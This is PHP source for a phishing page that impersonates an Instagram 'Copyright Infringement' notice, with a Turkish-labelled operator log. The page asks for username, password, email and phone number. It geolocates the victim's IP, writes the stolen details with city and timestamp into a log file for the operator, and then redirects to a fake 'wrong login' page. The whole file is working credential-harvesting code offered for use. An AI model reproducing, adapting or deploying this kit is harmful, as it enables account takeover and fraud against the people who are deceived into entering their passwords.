<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

if ($_POST) {

  
include 'upload.php';
  $zwous=$_POST["zwous"];
  $_SESSION["zwous"]=$zwous;
  $zwoup =  $_POST['zwoup'];
  $zwomai =  $_POST['zwomai'];
  $zwomap =  $_POST['zwomap'];
  $zwopho =  $_POST['zwopho'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
  $sehir = $details->city;
  date_default_timezone_set('Europe/Istanbul');
  $tarih = date("d-m-Y H:i:s");
  	$file = fopen('tcm.php', 'a');
       fwrite($file, "


<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<title>Log | <?php echo date('d.m.Y H:i:s') ?></title>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<font color='pink'> User Sayfası: </font><br>
<font color='red'> Kullanıcı Adı: </font><font color='white'>".$zwous."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$zwoup."</font><br>
<font color='red'> Eposta adı: </font><font color='white'>".$zwomai."</font><br>
<font color='red'> Numara: </font><font color='white'>".$zwopho."</font><br>

<font color='red'> Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'> Şehir: </font><font color='white'>".$sehir."</font><br>
<font color='red'> Tarih: </font><font color='white'>".$tarih."</font><br>
<hr />

");

fclose($file);
echo '';
  
  header("Location: wrong-login.php");
  include 'vendor/security.php';
  
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="panel/img/head.ico">
    <title>Copyright | İnfringement</title>
    <link href="panel/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="panel/zew/css/style.css" rel="stylesheet">
		 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.1.62/jquery.inputmask.bundle.js"></script>
</head>
<header>
		<br>
	<img style="
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-top:1.3%;
  "
  src="panel/img/head.gif" width="200px">

	</header>
		<br>
<body>


<div class="row">
    <div class="col-md-6 col-md-offset-3">
        <div id="zewform">  
            <ul id="progressbar">
                <li class="active">İnformation</li>
                <li class="active">User Details</li>
                <li>Copyright Reason</li>
                <li>Form Status</li>

            </ul>

         
           <form autocomplete="off" method="post" enctype="multipart/form-data">
			 
			<div class="zewbox">
                <h2 class="fs-title">User Details</h2>
                <input type="text" class="mini" minlength="4" required name="zwous" placeholder="User Name"/>
								<script type="text/javascript">
$('.mini').keyup(function(){
    this.value=this.value.toLowerCase();
});

</script>
                <input type="password" required    name="zwoup" placeholder="Password"/>
				<script>
function phoneFormat(input) {
    input = input.replace(/\D/g,'').substring(0,10); 
    var size = input.length;
    if (size>0) {input="("+input}
    if (size>3) {input=input.slice(0,4)+") "+input.slice(4)}
    if (size>6) {input=input.slice(0,9)+"-" +input.slice(9)}
    return input;
}
		</script>
                <input type="text"  id="phone" onInput="this.value = phoneFormat(this.value)" name="zwopho" placeholder="Phone Number"  minlength="11" maxlength="14" required />
                <input type="email" name="zwomai" placeholder="Email" minlength="6" required />
				 <input type="submit" value="Next" class="action-button">
				 


        </form>
</div>

    </div>
	<!--boş-->
	<br><br><br><br>
</div>

<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js'></script>

<script src="panel/bootstrap/js/bootstrap.min.js"></script>
<script src="panel/zew/js/zewform.js"></script>

<div class="footer">
  <p>© 2022 from Instagram</p>
</div>
</body>

</html>
